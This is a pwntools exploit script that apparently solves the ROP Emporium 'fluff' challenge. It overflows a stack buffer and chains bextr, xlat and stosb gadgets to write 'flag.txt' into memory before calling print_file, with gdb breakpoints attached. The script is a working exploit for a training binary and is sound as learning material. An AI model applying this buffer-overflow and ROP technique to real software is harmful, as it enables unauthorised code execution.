from pwn import *

elf = context.binary = ELF("./fluff")
r = elf.process()
gdb.attach(r, '''
    b*pwnme+152\n
    b*questionableGadgets+18\n
    c
''')

###############
#  ROP chain  #
###############
print_file = elf.sym["print_file"]
pop_rdx_rcx_add_rcx_bextr = 0x000000000040062a
xlat_ds_rbx_ret = 0x0000000000400628
stos_rdi_al_ret = 0x0000000000400639
_f = 0x4003c1 + 3
_l = 0x400238 + 1
_a = 0x4003cd + 9
_g = 0x4003cd + 2
_t = 0x4003cd + 8
_x = 0x400238 + 14
_dot = 0x4003c1 + 8
pop_rdi_ret = 0x00000000004006a3

payload = b"a" * 40
payload += flat(
    # store f
    pop_rdi_ret,
    0x601070,
    pop_rdx_rcx_add_rcx_bextr,
    0x2000,
    _f - 0x3ef2 - 0xb, #thanh ghi rax ban dau chua du lieu 0xb nen phai tru di
    xlat_ds_rbx_ret,
    stos_rdi_al_ret,

    #store l
    pop_rdx_rcx_add_rcx_bextr,
    0x2000,
    _l - 0x3ef2 - 0x66,
    xlat_ds_rbx_ret,
    stos_rdi_al_ret,

    #store a
    pop_rdx_rcx_add_rcx_bextr,
    0x2000,
    _a - 0x3ef2 - 0x6c,
    xlat_ds_rbx_ret,
    stos_rdi_al_ret,

    #store g
    pop_rdx_rcx_add_rcx_bextr,
    0x2000,
    _g - 0x3ef2 - 0x61,
    xlat_ds_rbx_ret,
    stos_rdi_al_ret,
    
    #store dot
    pop_rdx_rcx_add_rcx_bextr,
    0x2000,
    _dot - 0x3ef2 - 0x67,
    xlat_ds_rbx_ret,
    stos_rdi_al_ret,

    #store t
    pop_rdx_rcx_add_rcx_bextr,
    0x2000,
    _t - 0x3ef2 - 0x2e,
    xlat_ds_rbx_ret,
    stos_rdi_al_ret,

    #store x
    pop_rdx_rcx_add_rcx_bextr,
    0x2000,
    _x - 0x3ef2 - 0x74,
    xlat_ds_rbx_ret,
    stos_rdi_al_ret,

    #store t
    pop_rdx_rcx_add_rcx_bextr,
    0x2000,
    _t - 0x3ef2 - 0x78,
    xlat_ds_rbx_ret,
    stos_rdi_al_ret,

    pop_rdi_ret,
    0x601070,
    print_file
)

r.sendline(payload)
r.interactive()